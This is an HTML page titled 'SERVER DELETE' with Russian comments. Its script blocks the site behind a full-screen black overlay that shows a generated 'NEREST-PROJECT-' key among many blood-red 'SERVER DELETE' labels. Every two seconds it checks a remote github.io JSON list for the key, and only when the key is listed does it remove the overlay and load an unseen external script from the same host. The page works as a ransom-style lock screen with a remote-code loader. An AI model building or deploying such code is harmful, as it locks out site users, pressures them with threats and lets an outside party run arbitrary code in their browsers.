<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>SERVER DELETE</title>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Nosifer&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            background-color: black;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
(function () {
    'use strict';

    const storageKey = 'nerest_project_user_key';
    const prefix = 'NEREST-PROJECT-';
    const keyLength = 24;
    const remoteJsonUrl = 'https://descrober.github.io/dp0aikfeopjfow/codes.json';
    const externalScriptUrl = 'https://descrober.github.io/dp0aikfeopjfow/dadwadfafaf.js';

    function generateKeyWithPrefix() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < keyLength; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return prefix + code;
    }

    function cacheBust(url) {
        return url.includes('?') ? url + '&_cb=' + Date.now() : url + '?_cb=' + Date.now();
    }

    function loadExternalScript(url) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = url;
            script.onload = () => resolve();
            script.onerror = () => reject();
            document.body.appendChild(script);
        });
    }

    // Получаем или генерируем ключ
    let userKey = localStorage.getItem(storageKey);
    if (!userKey) {
        userKey = generateKeyWithPrefix();
        localStorage.setItem(storageKey, userKey);
    }

    // Создаём оверлей
    const blocker = document.createElement('div');
    Object.assign(blocker.style, {
        position: 'fixed',
        top: '0', left: '0',
        width: '100%', height: '100%',
        backgroundColor: 'black',
        color: '#fff',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: '9999999',
        flexDirection: 'column',
        userSelect: 'none',
        overflow: 'hidden'
    });

    blocker.innerHTML = `
        <code id="userKey" style="font-size:28px; color:#ff0000; user-select: text; background:rgba(0,0,0,0.7); padding:10px 20px; border-radius:5px; cursor:text; z-index:10000002; position:relative;">${userKey}</code>
    `;

    document.body.appendChild(blocker);

    generateCreepyText();

    // Статус проверки ключа
    const interval = setInterval(() => {
        fetch(cacheBust(remoteJsonUrl))
            .then(res => res.json())
            .then(validKeys => {
                if (validKeys.includes(userKey)) {
                    clearInterval(interval);
                    blocker.style.pointerEvents = 'none';
                    blocker.style.opacity = '0.3';
                    setTimeout(() => {
                        blocker.remove();
                        loadExternalScript(cacheBust(externalScriptUrl))
                            .then(() => console.log('Внешний скрипт загружен'))
                            .catch(err => {
                                console.error('Ошибка загрузки внешнего скрипта:', err);
                            });
                    }, 1500);
                }
            })
            .catch(err => {
                console.error('Ошибка проверки ключа:', err);
            });
    }, 2000);

    // 👻 Генерация страшных надписей
    function generateCreepyText() {
        const fonts = ['"Creepster", cursive', '"Nosifer", cursive', '"Courier New", monospace', '"Lucida Console"', 'Impact'];
        const bloodColors = ['#ff0000', '#8b0000', '#b22222', '#dc143c', '#ff2400'];

        for (let i = 0; i < 70; i++) {
            const el = document.createElement('div');
            el.textContent = 'SERVER DELETE';

            Object.assign(el.style, {
                position: 'fixed',
                top: Math.random() * 100 + '%',
                left: Math.random() * 100 + '%',
                transform: `rotate(${Math.random() * 360}deg) scale(${Math.random() * 1.4 + 0.6})`,
                fontFamily: fonts[Math.floor(Math.random() * fonts.length)],
                fontSize: Math.random() * 40 + 20 + 'px',
                color: bloodColors[Math.floor(Math.random() * bloodColors.length)],
                zIndex: '10000001',
                opacity: Math.random() * 0.9 + 0.1,
                pointerEvents: 'none',
                textShadow: `0 0 10px ${bloodColors[Math.floor(Math.random() * bloodColors.length)]}`
            });

            blocker.appendChild(el);
        }
    }

})();
</script>

</body>
</html>
